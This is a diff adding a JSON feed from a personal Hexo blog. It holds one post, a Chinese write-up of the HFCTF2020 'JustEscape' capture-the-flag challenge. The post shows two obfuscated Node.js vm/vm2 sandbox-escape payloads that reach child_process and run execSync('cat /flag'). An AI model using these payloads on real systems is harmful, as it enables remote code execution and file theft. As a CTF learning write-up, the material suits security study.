@@ -1,0 +1,19 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "Hexo • All posts by \"js-vm沙箱逃逸\" tag",
+    "description": "",
+    "home_page_url": "http://odiws.github.io",
+    "items": [
+        {
+            "id": "http://odiws.github.io/2024/06/19/HFCTF2020-JustEscape/",
+            "url": "http://odiws.github.io/2024/06/19/HFCTF2020-JustEscape/",
+            "title": "[HFCTF2020]JustEscape",
+            "date_published": "2024-06-19T13:35:43.000Z",
+            "content_html": "<h2 id=\"hfctf2020justescape\"><a class=\"markdownIt-Anchor\" href=\"#hfctf2020justescape\">#</a> [HFCTF2020]JustEscape</h2>\n<p>题目说真的不是 PHP 吗？<br>\n十有八九不是，猜测可能是 Java，结果是 js。</p>\n<h4 id=\"用errorstack看一下报错信息\"><a class=\"markdownIt-Anchor\" href=\"#用errorstack看一下报错信息\">#</a> 用 <code>Error().stack</code> , 看一下报错信息。</h4>\n<p><img data-src=\"../images/%5BHFCTF2020%5DJustEscape/1.png\" alt=\"1\"></p>\n<p>报错显示是 <code>vm.js</code> ，考的 vm 沙箱逃逸。<br>\nPOC 参考：<br>\nhttps://<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1naXRodWImYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\">github</span>.com/patriksimek/vm2/issues/225<br>\npayload1:</p>\n<pre><code>(function ()&#123;\n    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proc`&#125;ess`&#125;`)();\n    try&#123;\n        Object.preventExtensions(Buffer.from(``)).a = 1;\n    &#125;catch(e)&#123;\n        return e[`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();\n    &#125;\n&#125;)()\n</code></pre>\n<p>payload2：（join 拼接字符串）</p>\n<pre><code>(()=&gt;&#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &#125;catch(e)&#123; return e[`a`](()=&gt;&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat /flag`)[`toString`](); &#125; &#125;)()\n</code></pre>\n<p><img data-src=\"../images/%5BHFCTF2020%5DJustEscape/2.png\" alt=\"2\"></p>\n<p>获得 flag</p>\n",
+            "tags": [
+                "buuctf",
+                "js-vm沙箱逃逸"
+            ]
+        }
+    ]
+}
